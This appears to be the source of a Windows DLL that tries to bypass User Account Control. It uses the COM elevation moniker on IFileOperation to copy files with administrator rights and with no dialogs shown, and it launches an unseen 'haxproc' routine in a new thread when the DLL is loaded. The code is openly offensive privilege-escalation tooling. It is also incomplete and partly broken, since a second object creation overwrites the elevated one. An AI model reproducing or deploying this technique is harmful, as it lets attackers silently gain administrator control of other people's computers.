//// dllmain.cpp : DLL 애플리케이션의 진입점을 정의합니다.
//



// dllmain.cpp : Define el punto de entrada de la aplicación DLL.
#include <windows.h>
#include <iostream>
#include <objbase.h>
#include <ShobjIdl.h>
#include <shobjidl_core.h>
#include <Shellapi.h>     // Included for shell constants such as FO_* values
#include <shlobj.h>       // Required for necessary shell dependencies
#include <strsafe.h> 
#include <string>
#pragma warning(disable:4996)
//Still don't know how to import functions used by the dll from another file
int haxproc();
HRESULT CopyItem(__in LPCWSTR pszSrcItem, __in LPCWSTR pszDest, LPCWSTR pszNewName)
{
	//
	// Initialize COM as STA.
	//
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	if (SUCCEEDED(hr))
	{
		IFileOperation* pfo = NULL;
		// Create an IShellItem from the supplied source path.
		IShellItem* psiFrom = NULL;
		IShellItem* psiTo = NULL;

		BIND_OPTS3 bopts;
		ZeroMemory(&bopts, sizeof(bopts));
		bopts.cbStruct = sizeof(bopts);
		bopts.hwnd = NULL;
		bopts.grfMode = STGM_READWRITE;
		bopts.dwClassContext = CLSCTX_LOCAL_SERVER;
		//Binds COM Elevation Moniker with IFileOperation 
		hr = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", &bopts, IID_PPV_ARGS(&pfo));
		// Create the IFileOperation interface 
		//
		hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pfo));
		if (SUCCEEDED(hr))
		{
			// Set the operation flags. Turn off all UI from being shown to the
			// user during the operation. This includes error, confirmation,
			// and progress dialogs.
			//
			hr = pfo->SetOperationFlags(FOF_NO_UI | FOFX_REQUIREELEVATION | FOFX_NOCOPYHOOKS); //Flags thanks to kub0x
			if (SUCCEEDED(hr))
			{

				hr = SHCreateItemFromParsingName(pszSrcItem, NULL, IID_PPV_ARGS(&psiFrom));
				if (SUCCEEDED(hr))
				{


					if (NULL != pszDest)
					{

						hr = SHCreateItemFromParsingName(pszDest, NULL, IID_PPV_ARGS(&psiTo));
					}

					if (SUCCEEDED(hr))
					{

						// Add the operation
						hr = pfo->CopyItem(psiFrom, psiTo, pszNewName, NULL);

						if (NULL != psiTo)
						{
							psiTo->Release();
						}

					}

					psiFrom->Release();
				}

				if (SUCCEEDED(hr))
				{
					// Perform the operation to copy the file.
					hr = pfo->PerformOperations();
				}
			}

			// Release the IFileOperation interface.
			pfo->Release();
		}

		CoUninitialize();
	}
	return hr;
}






BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)haxproc, NULL, 0, 0);
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}